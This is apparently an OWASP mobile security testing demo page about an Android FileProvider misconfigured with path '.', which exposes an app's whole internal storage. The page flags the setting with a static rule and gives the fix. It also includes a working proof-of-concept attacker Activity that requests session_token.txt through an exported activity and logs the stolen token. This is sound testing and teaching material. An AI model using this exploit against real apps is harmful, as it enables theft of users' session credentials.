---
platform: android
title: Oversharing via FileProvider with Unrestricted Path Configuration
id: MASTG-DEMO-0122
code: [xml, kotlin]
tools: [MASTG-TOOL-0110]
kind: fail
test: MASTG-TEST-0357
---

## Sample

The code below sets up a `FileProvider` to share lab report PDFs with external apps (e.g., email clients or document viewers). While the provider is not directly exported (`android:exported="false"`), it enables URI grants via `android:grantUriPermissions="true"`. The `filepaths.xml` resource uses `path="."`, which exposes the entire internal `filesDir`, including sensitive files such as `session_token.txt`, to any app that receives a URI grant.

The Android Manifest exports the activity `ShareReportActivity` that can be queried by any other app.

{{ MastgTest.kt # MastgTest_reversed.java # AndroidManifest.xml # AndroidManifest_reversed.xml # filepaths.xml # filepaths_reversed.xml}}

## Steps

Let's run our @MASTG-TOOL-0110 rule against the `filepaths.xml` resource.

{{ ../../../../rules/mastg-android-fileprovider-broad-scope.yml }}

{{ run.sh }}

## Observation

The rule flags the `files-path` element with `path="."`.

{{ output.txt }}

## Evaluation

The test case fails because the FileProvider path configuration exposes the entire `filesDir` instead of only the intended `reports/` subdirectory.

- The `mastg-android-fileprovider-broad-scope.yml` rule flags `path="."` in `filepaths.xml`, confirming that any file in the app's internal storage can be shared via a URI grant — not just the intended lab report PDFs.
- An attacker who tricks the app into sharing a URI (e.g., by sending a crafted intent) can request `session_token.txt` or any other file under `filesDir` using the same `org.owasp.mastestapp.fileprovider` authority.
- The fix is to restrict the path to the specific subdirectory: `path="reports/"`.

An attacker app could retrieve the secret token from the provider app and print it to the logs.

```java
class AttackerActivity : ComponentActivity() {
    private val launcher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val uri = result.data?.data ?: run {
            Log.e("EXFIL", "no URI returned"); return@registerForActivityResult
        }
        contentResolver.openInputStream(uri)?.bufferedReader()?.use { reader ->
            Log.e("EXFIL", "Got from victim: ${reader.readText()}")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val intent = Intent().apply {
            setClassName(
                "org.owasp.mastestapp",
                "org.owasp.mastestapp.MastgTest\$ShareReportActivity"
            )
            // attacker picks the target file
            putExtra("file_name", "session_token.txt")
        }
        launcher.launch(intent)
    }
}
```

When using `adb logcat -s EXFIL` you will see the output of the attacker app.

```bash
adb logcat -s EXFIL
--------- beginning of main
<timestamp> 12521 12521 E EXFIL   : Got from victim: sess_7f3a9b1e4d2c8f0a5e6b3c1d9f4a2e7b
```
